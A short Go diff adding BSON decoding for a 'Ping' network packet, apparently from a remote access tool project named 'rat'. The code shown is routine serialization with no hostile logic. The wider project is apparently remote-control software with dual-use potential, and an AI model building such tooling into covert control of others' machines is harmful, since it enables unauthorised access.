@@ -5,6 +5,8 @@ import (
 	"rat/shared/network/header"
 
 	"time"
+
+	"gopkg.in/mgo.v2/bson"
 )
 
 type Ping struct {
@@ -28,4 +30,9 @@ func (packet Ping) OnReceive(c *Client) error {
 	}))
 
 	return nil
+}
+
+func (packet Ping) Decode(buf []byte) (IncomingPacket, error) {
+	err := bson.Unmarshal(buf, &packet)
+	return packet, err
 }
